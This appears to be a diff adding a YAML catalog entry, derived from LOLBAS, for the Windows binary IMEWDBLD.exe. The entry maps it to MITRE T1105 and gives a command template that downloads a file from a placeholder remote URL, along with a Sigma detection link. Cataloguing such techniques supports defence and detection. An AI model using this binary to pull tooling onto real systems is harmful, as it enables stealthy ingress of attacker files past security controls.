@@ -1,0 +1,92 @@
+id: lolbas/T1NCaW5hcmllcy9JTUVXREJMRC55bWw/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: IMEWDBLD.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml
+commands:
+- template: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
+  comment: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will
+    download the file served at by that URL and save it to INetCache.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: IMEWDBLD.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSBinaries/IMEWDBLD.yml
+      command_source_index: 0
+      document_utf8: "---\nName: IMEWDBLD.exe\nDescription: Microsoft IME Open Extended Dictionary Module\n\
+        Author: Wade Hickey\nCreated: 2020-03-05\nCommands:\n  - Command: C:\\Windows\\System32\\IME\\\
+        SHARED\\IMEWDBLD.exe {REMOTEURL}\n    Description: IMEWDBLD.exe attempts to load a dictionary\
+        \ file, if provided a URL as an argument, it will download the file served at by that URL and\
+        \ save it to INetCache.\n    Usecase: Download file from Internet\n    Category: Download\n  \
+        \  Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n\
+        \      - Download: INetCache\nFull_Path:\n  - Path: C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe\n\
+        Detection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml\n\
+        Resources:\n  - Link: https://twitter.com/notwhickey/status/1367493406835040265\nAcknowledgement:\n\
+        \  - Person: Wade Hickey\n    Handle: '@notwhickey'\n"
+      document_sha256: sha256:6343198a43a9ea29fc6cd6edf9e8f2fcfdaf9b051a8292b109662a079438a3d6
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:010d4dc3704fd54e259d44e4d1e8d2a40010865363b6931e7c8f654a23ac3d3a
